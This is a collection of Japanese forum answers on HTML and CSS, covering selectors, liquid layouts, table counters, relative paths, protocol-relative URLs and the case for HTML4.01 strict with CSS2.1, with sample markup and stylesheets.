http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) 　はスタイルシートを理解する時に必須です。これを知っていると知らないとでは、まるで違います。いちいちidやclassを書かなくて良くなるので楽です。メンテナンス性が劇的に改善される。 以下、スタイルシート部分 ★タブは＿に置換してあるので戻す。 ＿<style type="text/css"> <!-- html,body{margin:0;padding:0;} /* ディスプレイ幅に影響されないようリキッドにしておく */ /* スマホでも超幅広ディスプレイでも利用可能 */ div.header, div.section, div.footer{ ＿width:90%;min-width:630px;max-width:890px; ＿margin:0 auto;padding:5px; } div.header div#contentTable h3, div.section div.section h3{ ＿margin:0;line-height:1.8em; ＿border-bottom:2px gray solid; ＿padding:0 0.5em; ＿background-color:rgb(255,255,200); } div.header div#contentTable ol, div.header div#contentTable ol li{ ＿list-style:none;margin:0;padding:0; ＿text-align:ceter; } div.header div#contentTable ol li{ ＿margin:3px; } div.header div#contentTable ol li{ ＿display:inline-block; ＿width:22%; ＿position:relative; } div.header div#contentTable ol li img{ ＿display:block;/* 画像をblockにしてサイズ変更するように */ ＿width:90%;height:auto; } div.section{position:relative;} div.header div#contentTable, div.section div.section{ ＿min-width:0;width:auto; ＿margin-right:170px; ＿border:solid 2px gray; ＿min-height:160px;/* 挿絵画像のサイズが大きい場合はHTML側で指定 */ ＿padding:0; ＿position:relative;/* 子孫のサイズ基にするためrelative */ } div.section p{ ＿margin:0 1em; ＿text-indent:1em; ＿line-height:1.6em; } /* 二つ目以降(隣接セレクタ)のsub sectionの上マージンを指定*/ div.section div.section+div.section{ ＿margin-top:50px; } div.header div#contentTable p.Logo, div.section div.section p.Logo{ ＿margin:0;height:100%;/* relativeな親ブロックのサイズを基準 */ ＿position:absolute; ＿top:0;right:-170px; ＿width:160px; ＿text-align:center; } p.Logo img{ ＿display:block;/* 画像をblockにしてサイズ変更するように */ ＿width:90%;height:auto; ＿margin:5px auto; } div.guest h3:before{content:"Gest ";}/* ゲスト記事の目印 */ /* 分かりやすいように色をつけておく */ div.header{background-color:yellow;} div.section{background-color:silver;} div.footer{background-color:aqua;} div.section div.section{background-color:white;} div.header div#contentTable{background-color:lime;} div.section div.section p.Logo{background-color:fuchsia;} div.header div#contentTable p.Logo{background-color:orange;} div.section div.column h3{background-color:red;} --> ＿</style>
HTMLファイルを保存しているディレクトリに.htaccessで指定しておく(そのディレクトリにまとめて入れておくこと) .htaccessの内容 AddType application/octet-stream .html .htm .txt と・・一行書いておく。
適用されません。 <!ELEMENT (%heading;) - - (%inline;)* -- heading --> 　( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) と書かれているように、見出し要素は%inline要素のみ持つことが出来ます。 　そのためブラウザは <h1>あああ<br> <table border=1> <tr><td>1</td><td>2</td></tr> <tr><td>3</td><td>4</td></tr> </table> </h1> というソースを見つけると <h1>あああ<br></h1><!-- が抜けている --> <table border=1> 　<tbody><!-- tbody(table本文)が抜けている --> 　　<tr><td>1</td><td>2</td></tr> 　　<tr><td>3</td><td>4</td></tr> 　</tbody> </table> <h1><!--が抜けている。 --></h1> 　と解釈します。そのためにスタイルが適用されないのです。 <h1>あああ<br></h1> <table border="1" summary="テスト"> 　<tbody> 　　<tr><td>1</td><td>2</td></tr> 　　<tr><td>3</td><td>4</td></tr> 　</tbody> </table> h1,table[summary="テスト"]{color:green;font-size:50%;} なお、h1は見出しレベル1を示します。 BRは通常は使うはずのない要素です。スタイルシートで指定しましょう。
#1 ですがその回答に用語の間違いがありました。以下のように読み替えてください。 × カラーコード ○ カラーキーワード 回答の参考にしたページ： https://developer.mozilla.org/en-US/docs/Web/CSS …
　rssフィードは、単なるXMLファイルですから、スタイルの指定がなければドキュメントツリーが表示されるだけですよ。 　それ以上でもそれ以下でもない・・・メッセージの通りです。 　そもそもブラウザで閲覧するためではなく、RSSに対応したブラウザやメールソフトが利用する物ですから、ブラウザのツールメニューで「このページを購読」をクリックしたら設定されれば良いのですよ。
最近はゲームを実際に１から作る手順を教えている書籍がちょいちょいあります。 それなりの書店にいけばみかけますね。 エクセルのマクロでも作れるみたいですよ。 良いものを作りたかったらＣ＋＋などを勧めてるみたいですが、実際メモ帳でサイトもある程度作れますしね。 命令が違うだけで基本的な組立や論理思考は同じです。
もっとも良いのは--ハードルも高い---、fmlなどをインストールしてしまうことです。メーリングリストを登録から配信まで、まったく自動で行えます。 　⇒fml - Wikipedia( http://ja.wikipedia.org/wiki/Fml ) 　⇒fml project top page( http://www.fml.org/ ) 　一般的には、いわゆるフォームメール(CGI)で、管理者にメールを送っていただいて、それを手動でメーリングリストに登録すことになるでしょう。 「ニュースレターをお送りします」 　は、手動ではなく必ずシステムを利用しましょう。手動で行うとミスが起きうるので・・ 略してしまうと、名前が同じになりややこしいですが 　⇒freeml byGMO -メーリングリストを無料で簡単に作成！( http://www.freeml.com/ ) の有償サービスを使うと良いでしょう。 　配布数が少なく、ある程度技術があればフォームメールCGIを改良して作れます。 　また、御利用のプロバイダーにすでにサービスが用意されている場合もあります。
<a id=ABC></a> <script> var elm = document.getElementById("ABC"); elm.href = "http://google.com"; elm.innerText = "Googleにイっちゃう？"; </script> と書くと表示は <a id=ABC href=http://google.com>Googleにイっちゃった</a> のものとなります． そのたぐい，つまりJavaScriptによる制御じゃないでしょうか． （上記ソースを確かめる場合はDOMを読み込んだ後でスクリプトが実行されるような改変が必要で私は環境依存が激しい方法しか知らないので省きます．）
まあ、マルチなんだろうけど、 http://detail.chiebukuro.yahoo.co.jp/qa/question … こちらの回答をどうぞ。 上記の知恵袋のURLもそうだし、例えば2ちゃんねるのスレッドのURLもそういう感じですね。 フィレオフィッシュバーガーだけど質問ある？ http://hayabusa.2ch.net/test/read.cgi/news4vip/1 … 「rad.cgi」に「/news4vip/1381282625/」というパラメータが渡され、処理されてスレッドが表示されます。
tableのセル幅を指定するには、セレクタで指定すれば良いです。 tdやth--要素セレクタ--ひとつだと、詳細度は[0,0,0,1]ですから、さらに特定のセルを指定するなら、th + td　とか隣接セレクタなどで、指定すれば良いです。 　特定のtableでしたら、table要素に必須のsummary属性がありますから、 table[summary="test"] td{width:10em;} 　とか属性セレクタをつかって指定していきます。 　ie7は、CSS2.1の要素セレクタや隣接セレクタなどに対応していませんから、classを使用するなどの工夫が必要です。 table[summary="test"]{ border-collapse:collapse; border:solid 2px black; } table[summary="test"] th, table[summary="test"] td{ border:solid 1px gray; width:10em; } table[summary="test"] tr>th{ width:5em; } table[summary="test"] tr th + td + td{ width:20em; } とか・・ 　その状況状況に合わせて、文書構造を確認してセレクタを使って指定していく。
まぁ、みなさんの回答と同じことをいいますが、少しやさしく表現してみます。 idとは、学校でいうところの出席番号みたいなものです。 htmlには、idとは別にclassというものもありまして、classはその名の通り、クラス(組)としてとらえてください。 3年4組の人は複数いますが、3年4組の出席番号1番の人は、一人しかいません。 つまり、classは複数の要素に設定できるけど、idはひとつの要素にしか設定できないわけです。 javascriptのソースを見ていないのでなんとも言えませんが、もしかすると、idとしているところをclassに置き換えるだけで動くかもしれませんね。もちろん、htmlだけではなく、cssもjavascriptも編集する必要があるはずです。
広く使って構わないだろうと考えています。 たとえば下記リンクにあるスクリプト配布の snippet は全て // 始まりです。 <script src="//... ですが，<a href="//... と本質的には同じです。 Google Hosted Libraries - Developer's Guide - Make the Web Faster — Google Developers https://developers.google.com/speed/libraries/de … Google や Wikipedia が採用しているから必ずしも良いとは限りませんが，RFC 1738 にも定義されているため，使って問題のあるケースのほうが例外だと考えられます。 ちなみに URL を // で始めたとき，それが http:// と解釈されるとは限りません。 そのリンクの記述のあるページと同じスキームで解釈されるためです。 つまり，https://... のページに // 始まりのリンクがあった場合，それは https:// と解釈されるということです。 ローカルファイルをブラウザで見たときは file:// で始まりますが，そのとき //... は file://... と解釈されます。 先の Google ホスティングの実例では，http でも https でもちゃんとライブラリファイルが手に入るようになっています。 自分のサイトを https で安全に作成した場合に，身元のわからない http による外部ファイルをまぎれ込ませてしまうことを防ぐ目的がある，と思われます。 全くの余談ですが，RFC 3986 にある，URI にマッチする正規表現は，// 始まりに対してもマッチするようになっています。 RFC 3986 - Uniform Resource Identifier (URI): Generic Syntax http://tools.ietf.org/html/rfc3986#appendix-B
この世界、機能までの主流が今日は亜流ということが、しばしばなので-- しかし、 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　であることは、HTML4.01の勧告以来、変わることはないでしょう。 　すなわち 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTMLの性質上、プレゼンテーションに関する要素や属性は、次々と他の機構、とりわけスタイルシートに置換えられていく。 また、文書の構造をプレゼンテーションと切り離すことで広汎なプラットフォームや多様なメディアでの文書提供コストを低下でき、文書の改訂も容易になるということが、経験的に知られている。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　とすれば、「スマートフォン用のサイトを作成したい」ということは、上記と反することだと言うことは分かると思います。現実にはスマホ用は別サイト(URL)と言うのも結構あります。 　これらが意味することは、HTMLには文書構造だけを記述し、プレゼンテーションはスタイルシートに担わせる--分担--ということです。 　次期HTML5では、『推奨しない要素は、HTMLの将来のバージョンでは廃止になる可能性がある。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』の予告どおり、一切のプレゼンテーション的な要素や属性が廃止されます。 　mediaqueryですが、これは最終手段と考えると良いでしょう。基本的には 1) HTMLには文書構造だけを記述する。 　　HTML4.01strictないしXHTML1.0strictで作成する。 2) スタイルシートはリキッドデザインを基本とする。 　　これだけで、よほど凝った事を考えない限りスマホでも超幅広ディスプレイは無論、スクリーンリーダー、点字端末、携帯電話、プリンター、検索エンジンなど『どんな環境からもWebの情報を利用できるように』なるはずです。 3) さらにスマホなどで全くデザインを変える--mediaquery--ことも、代替スタイルシート(Alternate style Sheet)でユーザーにデザインを選択させることもしておく 　が、今も将来も良い方法でしょう。
下記HTMLにて IE10 で検証しましたが、リンク先にジャンプできない現象を再現できませんでした。 ---- <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html> <head> <meta charset="UTF-8" /> <title>test</title> </head> <body> <h1>test</h1> <p><a href="#etc">etc</a></p> <p style="margin-top: 2000px"><a name="etc">etc</a></p> </body> </html> ---- > file://から始まるローカルファイルでリンクが機能するしないの違いは何でしょうか？ 現状では原因を特定できません。 問題外と思われるソースを削除して切り分けし、「現象を再現可能な最小のHTMLソース」を掲示してください。
> <td align="center">L</td> </tr> </table> </td> </tr> <tr> <td align="center">5</td> <td> <table border=0 cellpadding=0 cellspacing=0 width="100%"> <tr> <td align="center">a</td> </tr> <tr> <td align="center">A</td> </tr> </table> </td> <td> <table border=0 cellpadding=0 cellspacing=0 width="100%"> <tr> <td align="center">b</td> </tr> <tr> <td align="center">B</td> </tr> </table> </td> <td> <table border=0 cellpadding=0 cellspacing=0 width="100%"> <tr> <td align="center">c</td> </tr> <tr> <td align="center">C</td> </tr> </table> </td> <td> <table border=0 cellpadding=0 cellspacing=0 width="100%"> <tr> <td align="center">d</td> </tr> <tr> <td align="center">D</td> </tr> </table> </td> <td> <table border=0 cellpadding=0 cellspacing=0 width="100%"> <tr> <td align="center">e</td> </tr> <tr> <td align="center">E</td> </tr> </table> </td> <td> <table border=0 cellpadding=0 cellspacing=0 width="100%"> <tr> <td align="center">f</td> </tr> <tr> <td align="center">F</td> </tr> </table> </td> </tr> <tr> <td align="center">6</td> <td> <table border=0 cellpadding=0 cellspacing=0 width="100%"> <tr> <td align="center">g</td> </tr> <tr> <td align="center">G</td> </tr> </table> </td> <td> <table border=0 cellpadding=0 cellspacing=0 width="100%"> <tr> <td align="center">h</td> </tr> <tr> <td align="center">H</td> </tr> </table> </td> <td> <table border=0 cellpadding=0 cellspacing=0 width="100%"> <tr> <td align="center">i</td> </tr> <tr> <td align="center">I</td> </tr> </table> </td> <td> <table border=0 cellpadding=0 cellspacing=0 width="100%"> <tr> <td align="center">j</td> </tr> <tr> <td align="center">J</td> </tr> </table> </td> <td> <table border=0 cellpadding=0 cellspacing=0 width="100%"> <tr> <td align="center">k</td> </tr> <tr> <td align="center">K</td> </tr> </table> </td> <td> <table border=0 cellpadding=0 cellspacing=0 width="100%"> <tr> <td align="center">l</td> </tr> <tr> <td align="center">L</td> </tr> </table> </td> </tr> </table> 文字数オーバーで途中でぶった切ったので、繋げて使用すること。
<a href="/#name">name</a> じゃないの？？？
＞後出しで申し訳ないのですが、HTMLタグを含んだコンテンツを表示する方法は有りますでしょうか。 ＞具体的には、<A>タグをつけてそこからリンクできるようにしたいです。 の二つは異なりますよ。 【説明】 　　contentは内容の追加をするプロパティです。 　{用語説明] 　　　<h1>見出し</h1> 　　　　<h1>～</h1>までを要素(Element)と言います。heading(見出し(レベル１))要素です。 　　　　"見出し"が内容です。 　　　　<img src="" width="" height="" alt="">要素には内容がありませんからcontentは使えません。 　このことから、リンクを表示したい場合は、すでにリンク（href属性をもつ）A要素がないと方法がありません。逆に言うと、それがあると可能です。 table要素には、 必須のtbodyと thead,tfoot,caption要素を持つことが出来ます。前例のようにcaption要素を使用するのも良いですがcaptionには条件があります。 　tableの開始要素の直後でなければならない!ことと一つしか書けない。 『CAPTION要素は、TABLE要素の開始タグ直後にのみ存在し得る。 1つの TABLE要素は、1つのCAPTION要素しか包含できない。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 　この制約から、カウンターの増加処理後に内容を追加することは出来ません。 　　多くのブラウザは、captionがtbodyのあとなど、他の場所に現れても処理はしてくれます。---バグと言うより、エラーを吸収する--- 　　のですが、これに期待するのは好ましくないので、ここはthead,tfoot要素を使うのが最善でしょう。 　　　仕様上は(注)tfoot(theadも)本来はtbodyより前に書くべきです。が、すべての標準ブラウザは前に表示してくれます。 1) 必ずtbodyの前後に表示される。 2) 行数が増えて、印刷時に複数にまたがる場合も、何もしなくても各ページに表示される。 　と言う利点があります。 　　　行数を大きく増やして確認してください。印刷プレビューも面白いです。 ★HTML\lintだとtheadの位置について指摘が入りますが、それ以外はＯＫです。 ★行数が増えても、カウントして表示してくれるはずです。 ★HTMLは、メンテナンスを考慮して極力シンプルにしてあります。 ★スタイルシートは、セレクタの書き方やカスケーディングは、最も重要な部分ですから自習してください。 5 セレクタ( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) 6 プロパティ値とカスケーディング、継承の割り当て( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) 　プロパティなんかより、はるかに重要な部分です。これをマスターしないと下記ソースは意味不明かもしれません。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- body{counter-reset: tableline2;} table[summary="test2"]{ width:70%; position:relative; margin:20px auto; border-collapse:collapse; line-height:2em; border:none; } table[summary="test2"] tbody th,table[summary="test2"] tbody td{ padding:0.5em 1em; } table[summary="test2"] thead td, table[summary="test2"] tfoot td{border:none;} table[summary="test2"] thead tr+tr th{ border:solid 1px black; text-align:center; } table[summary="test2"] tbody td, table[summary="test2"] tbody th{ border:solid 1px black; } table[summary="test2"] thead td, table[summary="test2"] tfoot td{ text-align:right; } table[summary="test2"] tbody tr{counter-increment: tableline2 1;} table[summary="test2"] thead td a:after, table[summary="test2"] tfoot td a:after{ content:counter(tableline2) "件"; } --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<p>このページでは・・・・</p> ＿</div> ＿<div class="section"> ＿＿<h2>見出し</h2> ＿＿<table border="1" summary="test2"> ＿＿＿<tbody> ＿＿＿＿<tr> ＿＿＿＿＿<th abbr="param1">パラメータ</th><td>1,200-</td><td>説明</td> ＿＿＿＿</tr> ＿＿＿＿<tr> ＿＿＿＿＿<th abbr="param2">パラメータ</th><td>1,400-</td><td>説明</td> ＿＿＿＿</tr> ＿＿＿＿<tr> ＿＿＿＿＿<th abbr="param3">パラメータ</th><td>1,600-</td><td>説明</td> ＿＿＿＿</tr> ＿＿＿＿<tr> ＿＿＿＿＿<th abbr="param4">パラメータ</th><td>1,800-</td><td>説明</td> ＿＿＿＿</tr> ＿＿＿＿<tr> ＿＿＿＿＿<th abbr="param4">パラメータ</th><td>1,800-</td><td>説明</td> ＿＿＿＿</tr> ＿＿＿＿<tr> ＿＿＿＿＿<th abbr="param5">パラメータ</th><td>2,000-</td><td>説明</td> ＿＿＿＿</tr> ＿＿＿</tbody> ＿＿＿<tfoot> ＿＿＿＿<tr> ＿＿＿＿＿<td colspan="3"><a href="./">表示件数</a></td> ＿＿＿＿</tr> ＿＿＿</tfoot> ＿＿＿<thead> ＿＿＿＿<tr> ＿＿＿＿＿<td colspan="3"><a href="./">表示件数</a></td> ＿＿＿＿</tr> ＿＿＿＿<tr> ＿＿＿＿＿<th abbr="param">パラメーター</th><th abbr="price">価格</th><th abbr="説明">説明</th> ＿＿＿＿</tr> ＿＿＿</thead> ＿＿</table> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2012-08-10</dd> ＿＿＿<dt id="LAST-MODIFIED">Last Modified</dt> ＿＿＿<dd>2012-08-10 12:00:00 (JST)</dd> ＿＿</dl> ＿＿<address>&copy; ORUKA1951 2012 - 2016 All Rights Reserved mailto:*****</address> ＿</div> </body> </html>
勘違いしないでください。HTML/CSSはプログラミング言語ではないのでそういうことはできません。 「できない」のだから試行錯誤のしようがないはずですがねえ…。 JavaScriptで簡単にできるので調べてみてください。 ヒント↓ https://www.google.co.jp/search?q=javascript+tab …
サーバーのBasic認証(アクセス制限)を使用しますが、ID登録やパスワードの発行を自動化したいのでしたら、適当なプログラムを作成する必要があります。 　Perlを使用したCGIが、もっとも良く使われているでしょう。 ⇒CGI RESCUE - CGIフリーソフト( http://www.rescue.ne.jp/ ) 　の上から2/3あたりに[アクセス制限・管理]というジャンルがあります。その右横あたりに「基本認証」というマニュアルもあります。 　また、ロボットによる利用を排除するために、imageMagickなどを使用したキーワードを画像を目で読み取って入力する登録処理も必要になるでしょう。
「主流」という意味ではXHTML1.0が一番多いと思います。 HTML5はまだ正式勧告前なので早い…という声もありますが、 現場ではすでに使われていますし、HTML5でのコーディングをメインとしている会社も多くなったと感じます。 2014年に正式勧告予定なので、「これから大幅な変更は無いと」見越して使っているものだと思われます。 また、IE6などの旧ブラウザが1～2%代にまで減ってきているので、 そのあたりを切り捨ててHTML5 + CSS3で書く、というのも現実的になっています。 私の場合は、普段はXHTML1.0ですが、HTML5は要望があった場合に使いますので出来るようにはしています。 CSS3は結構採用していて、旧ブラウザでみた場合は、レイアウトずれなどは起こらず「問題無く閲覧できる」状態にはしますが、CSS3で書いたシャドウなどは無い、という感じにしています。 主流はXHTML1.0、時代を先取りするならHTML5という感じじゃないですかね。 もはや先取り感は無いかもしれませんが。
スライドショーというのは、パワーポイントでのような 本格的なものをお考えでしょうか。 単に、ＷＥＢサイトにおける自動ページ送りのような もので良ければ、以下の方法はどうでしょうか。 ・６つのhtmlをそれぞれ用意。 ・たとえば、３秒後にxxxx.htmに遷移するのであれば、以下を記述 <meta http-equiv="REFRESH" content="3;URL=xxxx.htm">
headタグ内で文字コードの指定を行っていないので、ブラウザーが勝手に判断しようとします。 その判定に失敗しているのでしょう。
スタイルシート部分です。 <style type="text/css"> <!-- html,body{margin:0;padding:0;} div.header,div.section,div.footer{ width:80%;min-width:640px;max-width:900px; margin:0 auto; } h2{display:none;} div.section{text-align:center;} div.section div.section, div.section div.aside{ float:left; width:auto;min-width:0; border-radius:5px; margin:3px; } div.section div.aside{ width:150px; border:1px solid gray; } div.section div.section div.section{float:none;} #syoku{width:200px;} #syoku ol{ list-style-type:none; display:block; margin:0;padding:0; text-align:center; border:outset 2px gray; line-height:2em; } #syoku ol li{ display:inline-block; margin:0;padding:0; border:inset 2px gray; width:45%; } #otherSearch input{margin:0 1em;} #otherSearch div.section{border:green solid 1px;} #news2:before{ content:""; display:block; clear:left; } /* 色分け */ #syoku{background-color:#339933;} #syoku li{background-color:lime;} #areaSearch{background-color:lime;} #keywordSearch{background-color:silver;} #priceSearch{background-color:yellow;} #userRegist{background-color:#D2691E;} #news1{background-color:#FF33CC;} #news2{background-color:#FF00CC;} --> </style>
一度、 　⇒はじめてのWebドキュメントづくり ( http://www.asahi-net.or.jp/%7Esd5a-ucd/www/ ) を通しで自習してみてください。 Windowsの場合は、カレント(現在地)からフォルダーを移動するときに、..\..\で上に移動し、[ファイル名]だけだと、同じ位置(カレント)にあるファイルですし、それが[フォルダー名]だと、そのフォルダーに移動します。 　後者の場合は、.\[ファイル名またはフォルダ名]です。.[ファイル名またはフォルダ名]では移動できません。 　Windowsでしたら「コマンドプロンプト」を起動して色々と試してみてください。Windowsでは/ではなく\です。 >dir >cd My Documunts >cd ..　　　　　または>cd ..\ それが一番良い練習かと ＞.aaaaaa.htmlこれだと同じ階層。 いいえ、単にaaaaaa.htmlです。 ＞..aaaaaa.htmlこれだと階層が一つ下がると思います。 いいえ、具体的にフォルダ名を指定しないとダメです。 <a href="./abc/efg.html">だと、カレントにあるabcフォルダー内のefg.html <a href="../hij/klm.html">だと、ひとつ上の階層にあるhijフォルダー内のklm.html <a href="../nop.html">だと、ひとつ上の階層のnop.html
アニメーションGIFで良いでしょう。 ２～数枚の画像を256色で減色して切り替えるだけです。よい減色ツールがあれば、写真と変わらないくらいに見えでしょう。
PC用サイトを作り直せばよいです。 元々・・ 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　なのですから、そのためにHTMLを使ってウェブページを作成してきたのでしょう??? 　今後も益々増え続ける様々な解像度、サイズの端末用に作らなくてもよいからこそ、HTMLを使ってページを作成してきたのですよ。PC用スマホ用に同じようなコンテンツで作りかえることはしなくてすむはずです。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 文書の構造をプレゼンテーションと切り離すことで広汎なプラットフォームや多様なメディアでの文書提供コストを低下でき、文書の改訂も容易になるということが、経験的に知られている。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［2.4.1 構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　ブラウザはスマホやPCのブラウザだけではありません、検索エンジンも今はそのひとつに考えなければなりません。『広汎なプラットフォームや多様なメディア』に対応する物(リキッドデザイン)を作り、それでも足りない場合はmediaqueryを使ってスタイルシートを切り替えるのが良いでしょう。 　ウェブ製作でしたら、開発者向けツール( https://addons.mozilla.jp/firefox/extensions/dev … )の豊富なfirefoxをお使いだと思いますが、 FireMobileSimulator( https://addons.mozilla.jp/firefox/details/8519 )で検証した程度で済むはずです。
どちらも平行して覚えましょう。 HTMLは、SGMLというマークアップ言語をヒントに作られたもの(XMLじゃない) SGMLを簡略化したものがXML HTMLをXMLに合わせて書き直した物がXHTML でありXMLに適合 XHTML 　XMLなので、機械的な処理がしやすい。文法が厳密である。 HTML 　人が書くことを想定しているので多少の誤りは許容される。 　現在勧告に向けて作業が進行しているHTML5は、それ自体にXHTMLでの記述を含んでいます。 ⇒1.6 HTML vs XHTML( http://www.w3.org/TR/html5/introduction.html#htm … ) ⇒Polyglot Markup: HTML-Compatible XHTML Documents( http://www.w3.org/TR/html-polyglot/ ) 　HTML5は、XHTMLとしても記述できます。 ＞HTML５というのが一番新しいらしいので、 　このあたりの事情は 　⇒HTML5が持つ本当の意味 － ＠IT( http://www.atmarkit.co.jp/news/200801/25/html.html ) 　　の「XHTMLがあるのに、なぜ今さらHTML？」を呼んで置かれると良いでしょう。 本題です。 　もっとも良いのは、HTML4.01strict(断じてframesetやtransitinalじゃありませんよ) 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。 ・・・【中略】・・・ 推奨しない 　推奨しない要素・属性とは、新しい枠組みができたことによって、陳腐化したものを指す。 ・・・【中略】・・・ 推奨しない要素は、HTMLの将来のバージョンでは廃止になる可能性がある。 　　　　　　　　　　　　^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^※ ・・・【中略】・・・ 　一般的に言って、スタイルやフォーマットを整えるためには、HTMLのプレゼンテーション属性ではなくスタイルシートを使用すべきである。スタイルシートによる代替が可能なHTMLのプレゼンテーション属性は、推奨しないこととなった。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Conformance: requirements and recommendations (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より ※推奨しない要素や属性が廃止されたのがHTML5 　^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ ただし、HTML5は、実に巨大な仕様で一挙に習得するのは困難です。また、ふるいユーザーエージェントは対応していません。 そして、HTML4.01strictからHTML5への大きな変更点は『HTML5 における HTML4 からの変更点( http://standards.mitsue.co.jp/resources/w3c/TR/h … )』にまとめられていますから、それを参考にHTML4.01strictを学ばれると無駄がなく効率的です。 ★スタイルシート 　これはもCSS2.1を学びましょう。上記「HTMLのプレゼンテーション属性ではなくスタイルシートを使用すべきである。」で理解されていれば、CSSの重要性はわかるでしょう。 　 ★最後に、現在ウェブ標準として一般的に認知されているのは HTML4.01strict (またはXHTML1.0strict) CSS2.1 と考えて良いでしょう。 　⇒ウェブ標準、それは状況や環境に左右されない情報伝達を実現するためのもの | Web担当者Forum( http://web-tan.forum.impressrd.jp/e/2007/07/27/1 … ) 　ここまでで、何をまず学ぶべきかは判断できると思います。とりあえずそれぞれの仕様書を読破しましょう。
background-image: url(image/sky82.jpg);を background-image: url("image/sky82.jpg");に 下記の2行を削除 background-repeat: no-repeat; background-position: right bottom; <body bgcolor="5998E7" text="#ffffff">を <body text="#ffffff">に 先ずは変更してみてください 手元の適当な画像と、訂正後のHTMLを組み合わせてみたのが 添付画像です（背景の水玉がsky82.jpg）
　WordpressもDWも、HTMLもCSSも何も基礎知識が無いのに、トレンドな言葉だけが選考しているように見受けられます。 　そのため、質問が全く「ちぐはぐ」です。 　Wordpressは、ブログ( http://ja.wikipedia.org/wiki/%E3%83%96%E3%83%AD% … )の一種(たぶん現在最も普及している--一昔前はMovable Type( http://ja.wikipedia.org/wiki/Movable_Type )でした。)です。 　ブログとはCMS( http://ja.wikipedia.org/wiki/%E3%82%B3%E3%83%B3% … )のひとつの用途です。 　CMSは、いちいちHTMLソースや、HTMLを作成するプログラムを書かなくても、動的にウェブサイトを構築できるツールです。Dreamweaverとは、根本的に異なります。 　CMSは極論すれば、掲示板システムに怪我は得たような物です。 　あなたにとって、最も効率的な、無駄のない、最も早く身につける最短の、最善の方法は、(最低でも)HTMLとCSSをテキストエディタでかけるようになる事です。 　それが出来るようになると、今まで質問されてきたすべての疑問が氷解するでしょう。 　それを身につければ、DWにしろWoredpressにしろ使う時に役に立ちますし、それらのマニュアルも理解できるようになるでしょう。へんな・・答えるのに窮するような質問もしなくてすみます。 　DW、wordpress,Photshop,Illustrator・・そんな物後回しにして、まず身につけることはウェブの基礎知識です。 　個人で趣味のサイトを作るなら、必要ありませんが、すくなくとも「WEBデザイナー」を目指すなら、それが必須です。 　⇒ウェブサイトの作成方法について - Webデザイン・CSS - 教えて！goo( http://oshiete.goo.ne.jp/qa/8263386.html ) 　も参考になると思います。 　
<div class="register" <input 　～～ がおかしいと感じないなら、inputとか扱う前にHTML初めから勉強してこいってことだ。
スペースを入れずに英数字を並べると、それが1単語として解釈されます。 すると、途中で改行されないようになってしまうのです。 日本語の場合は、そもそも文にスペースを入れないので、どこでも改行してくれるようにしているのだと思います。 英語の場合は、所々にスペースを入れると、ちゃんと改行されますよ。 例: <article> <h4>Let'sStudy</h4> gjrjahreie1ahuuularhj gvikjerakgviahejkrgv fhjakiufhjkriuehfjak rouihfjkaofrueihufdj koriehjfkdkioui </article> もし、スペースのない長い単語でも改行させたいのであれば、スタイルに word-wrap: break-word; を指定してあげます。 http://www.tagindex.com/stylesheet/text_font/wor … ちなみに、これは article に限ったことではないです。他のブロック要素（p, div など）でも同様の事が言えます。
frameborder="0" 参考URL：http://www.htmq.com/html/frame.shtml
